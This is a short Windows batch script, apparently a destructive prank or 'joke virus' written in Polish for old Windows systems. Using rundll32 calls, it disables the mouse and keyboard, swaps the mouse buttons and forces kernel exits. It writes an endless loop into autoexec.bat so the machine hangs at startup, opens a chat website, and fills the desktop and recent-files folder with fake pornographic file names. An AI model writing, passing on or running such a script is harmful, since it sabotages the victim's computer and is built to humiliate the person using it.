@echo off
rundll32 user,disableoemlayer
rundll32 mouse,disable
rundll32 keyboard,disable
rundll32 user,swapmousebutton
rundll32 krnl386.exe,FatalExit
rundll32 user,SetDoubleClickTime
echo dir /s /v c:\*.* >>c:autoexec.bat
copy %windir%\help\*.* c:\windows\pulpit\*.txt >nul
rundll32 krnl386.exe,exitkernel
echo :petla>>c:\autoexec.bat
echo goto petla>>c:\autoexec.bat
start www.czateria.pl
cmd.exe
echo. >%windir%\pulpit\porno.avi
echo. >%windir%\pulpit\pamela69.mpg
echo. >%windir%\pulpit\sex.jpg
echo. >%windir%\pulpit\xlaski.lnk
echo. >%windir%\pulpit\lesby.avi
echo. >%windir%\pulpit\xxx.mpg
echo. >%windir%\pulpit\gay.avi
echo. >%windir%\pulpit\laska.gif
echo. >%windir%\pulpit\pozycje.avi
echo. >%windir%\pulpit\sex001.avi
echo. >%windir%\recent\porno.avi
echo. >%windir%\recent\pamela69.mpg
echo. >%windir%\recent\sex.jpg
echo. >%windir%\recent\xlaski.lnk
echo. >%windir%\recent\lesby.avi
echo. >%windir%\recent\xxx.mpg
echo. >%windir%\recent\gay.avi
echo. >%windir%\recent\laska.gif
echo. >%windir%\recent\pozycje.avi
echo. >%windir%\recent\sex001.avi
